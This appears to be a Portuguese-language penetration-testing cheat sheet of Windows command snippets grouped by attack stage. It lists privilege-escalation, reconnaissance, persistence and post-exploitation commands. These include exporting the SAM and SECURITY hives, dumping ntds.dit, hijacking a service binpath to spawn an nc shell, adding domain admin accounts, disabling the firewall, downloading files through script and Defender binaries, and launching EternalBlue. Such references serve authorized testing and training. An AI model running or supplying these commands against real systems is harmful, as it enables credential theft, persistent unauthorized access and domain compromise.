# windows

#plateform/windows #target/local #cat/PRIVESC

## Obter informações de sistema
```
systeminfo
```
## Obter informações do sistema filtrando
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

## Procurar senhas
```
findstr /si 'password' *.txt *.xml *.docx
```

## Procura por senhas - prefência de política de grupo (ms14-025)
```
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
```

## Obtem patches
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

## Obter hostname
```
hostname
```

## Obter nome do computador
```powershell
$env:computername
```

## Mostra o ambiente - Lista todas as variaveis de ambiente
```
set
```

## solicitação de DNS para o DC
```
nslookup -type=any <userdnsdomain>.
```

## Exibe discos montados
```
wmic logicaldisk get caption,description,providername
```

## Exibe a lixeira
```
dir C:\$Recycle.Bin /s /b
```

## Obtem a arquitetura
```
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
```

## obtem tarefas agendadas
```
schtasks /query /fo LIST /v
```

## lista uma tarefa agendad em especifico
```
schtasks /query /fo LIST 2>nul | findstr <taskname>
```

## lista os processos
```
tasklist /V
```

## lista processos e links para iniciar serviços
```
tasklist /SVC
```

## lista serviços do windows iniciados (1)
```
net start
```

## lista os serviços (2)

```
wmic service list brief
```

## lista os serviços (3)
```
sc query
```

## lista os softwares instalados (1)
```
dir /a "C:\Program Files"
```

## lista os softwares instalados (2)
```
dir /a "C:\Program Files (x86)"
```

## lista os softwares instalados (3)
```
reg query HKEY_LOCAL_MACHINE\SOFTWARE
```

## Exibe valor das credenciais em cache do LSA
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## Consulta no registro pela palavra "password" (1)

```
reg query HKLM /f password /t REG_SZ /s
```
## Consulta no registro pela palavra "password" (2)
```
reg query HKCU /f password /t REG_SZ /s
```

## Consulta no registro para extrair o SAM

When the Windows operating system is running, the hives are in use and mounted. The command-line tool named reg can be used to export them.

```
reg save HKLM\SAM 'C:\Windows\Temp\sam.save'
reg save HKLM\SECURITY 'C:\Windows\Temp\security.save'
reg save HKLM\SYSTEM 'C:\Windows\Temp\system.save'
```

## Cria um copia "sombra" (shadow)
```
wmic shadowcopy call create Volume='C:\'
```

## lista as copias sombras (shadow)
```
vssadmin list shadows
```

## Verifica o privilégio do serviço
```
accesschk.exe /accepteula -ucqv <service_name>
```

## Reconfigura o serviço
```
sc config <service> binpath= "C:\nc.exe -nv 127.0.0.1 4444 -e C:\WINDOWS\System32\cmd.exe"
```

## Muda o serviço
```
sc config <service> obj= ".\LocalSystem" password= ""
```

## inicia o serviço
```
net start <service>
```

## verifica permissões (1)
```
accesschk.exe /accepteula -dqv "<file>"
```

## verifica permissões (2)
```
cacls "<file>"
```

## Identifica pastas com permissões fracas
```
accesschk.exe -uwdqs Users <c>:\
```

## Identifica arquivos com permissões fracas
```
accesschk.exe -uwqs Users <c>:\
```

% windows, download

## VBS download file script
#cat/ATTACK/FILE_TRANSFERT
```
echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();WScript.Echo(WinHttpReq.ResponseText); > fu.js && cscript /nologo fu.js <file_url> > <downloaded_file>
```

% windows, users

## adiciona usuário
#cat/PERSIST
```
net user <username> <password> /ADD
```
## adicioa usuário ao domínio
#cat/PERSIST
```
net user <username> <password> /ADD /DOMAIN
```

## adiciona usuário como admin
#cat/PERSIST
```
net localgroup administrators <username> /add
```

## executa como outro usuário
#cat/PRIVESC
```
runas /user:<domain>\<user> cmd.exe
```

## whoami - Todas as informações sobre mim, procure pelos tokens habilitados
#cat/PRIVESC
```
whoami /all
```
## whoami privilegiado
#cat/PRIVESC
```
whoami /priv
```
## lista todos os usuários
#cat/PRIVESC
```
net users
```
## lista os domain admin (fr)
#plateform/windows  #target/local #cat/RECON
```
net group "Admins du domaine"
```
## informações sobre os usuários 
#cat/RECON
```
net user <username>
```
## informações sobre o Administrador e recupera o SID
```powershell
[wmi] "Win32_userAccount.Domain='<computer_name>',Name='Administrator'"
```

## informações sobre a politica de senhas
#cat/RECON
```
net accounts
```
## quem esta logado
#cat/PRIVESC
```
qwinsta
```

## Lista credenciais
#cat/POSTEXPLOIT/CREDS_RECOVER
```
cmdkey /list
```
## exibe grupos locais
#cat/RECON
```
net localgroup
```
## exibe um grupo local específico
```
net localgroup <group_name>
```
## Mostra usuarios do grupo de domínio
```
net group /domain <domain_group_name>
```

% windows, domain infos

## Obter nome do dominio
```
echo %USERDOMAIN%
```
## Obter nome do dominio (2)
```
echo %USERDNSDOMAIN%
```
## obter nome de dominio do computador (3)
```
systeminfo | findstr /B /C:"Domain"
```

## Obter nome do DC
```
echo %logonserver%
```
## obter nome do DC (2)
```
set logonserver #Get name of the domain controller
```
## lista grupos do domínio
```
net group /domain
```

## lista os computadores conectados ao domínio
```
net group "domain computers" /domain
```
## Lista todos os PCs do domínio
```
net view /domain
```
## lista os domain controllers
```
nltest /dclist:<domain>
```

## lista contas de pc dos domain controllers
```
net group "Domain Controllers" /domain
```

## Lista usuários que tem privilegio de domain admin
```
net group "Domain Admins" /domain
```

## adiciona um usuário pra o grupo de domai admins
```
net group "Domain Admins" <username> /add /domain
```

## adiciona um usuario para o grupo domain admin - FR
```
net group "Admins du domaine" <username> /add /domain
```
## Lista usuarios que pertecem ao grupo de administradores dentro do domínio
```
net localgroup administrators /domain
```
## lista todos os usuários do domínio
```
net user /domain
```
## obtem informações sobre um usuário de domínio
```
net user <username> /domain
```

## Checar politica de senhas e de lockout do domínio
```
net accounts /domain
```
## Obtem o mapeamento das relações de confiança
```
nltest /domain_trusts
```

% windows, network
## Todas as interfaces
```
ipconfig /all
```

## exibe todas as rotas
```
route print
```

## lista hosts conhecidos
```
arp -a
```
## lista portas abertas
```
netstat -ano
```
## exibe arquivo de hosts
```
type C:\WINDOWS\System32\drivers\etc\hosts
```

% windows, dir
## exibe arquivos ocultos
```
dir /a:h <path>
```
## lista recursiva
```
dir /s /b
```

% windows, firewall
## exibe estado do firewall
```
netsh firewall show state
```

## exibe configurações do firewall
```
netsh firewall show config
```

## desliga o firewall 
```
netsh Advfirewall set allprofiles state off
```

## desliga o firewall (2)
```
netsh firewall set opmode disable
```

## liga o firewall
```
netsh Advfirewall set allprofiles state on
```

## abrir a porta  do RDP no firewall
```
netsh firewall add portopening TCP 3389 "Remote Desktop"
```

% windows, ntds.dit
## dump ntds.dit (Windows >= 2008 server) - metodo 1
```
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
```
## dump ntds.dit (Windows >= 2008 server) - metodo 2
```
esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
```
## dump ntds.dit (Windows <= 2003 server)
```
net start vss && vssadmin create shadow /for=c: && vssadmin list shadows && copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\temp
```

% windows, smb, share
## lista de computadores
```
net view
```

## lista os shares de computadores no dominio
```
net view /all /domain <domain_name>
```

## list o share de um computador
```
net view \\<ip> \ALL
```

## montar um share localmente
```
net use x: \\<ip>\<share_name>
```

## checar o share atual
```
net share
```

% windows, file, download
## windows baixar arquivo com windows defender
```
"c:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\mpcmdrun.exe" -DownloadFile -url <url> -path <result_file>
```

## baixar arqivo com o windows defender
```
mpcmdrun.exe -DownloadFile -url <url> -path <result_file>
```

% windows, active directory, dns

## identificar o IP do AD - exibe nome de domínio e dns
```
nmcli dev show <interface>
```

## nslookup AD - domínio
```
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain_name>
```

% windows, active directory

## habilitar historico de SID
Enable history on source domain for target domain (useful for forest extra SID exploitation)
```
netdom trust <source_domain> /d:<target_domain> /enablesidhistory:yes
```

% windows, cve
## windows eternal blue - smb - ms17-010
```
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue"
```

= interface: eth0
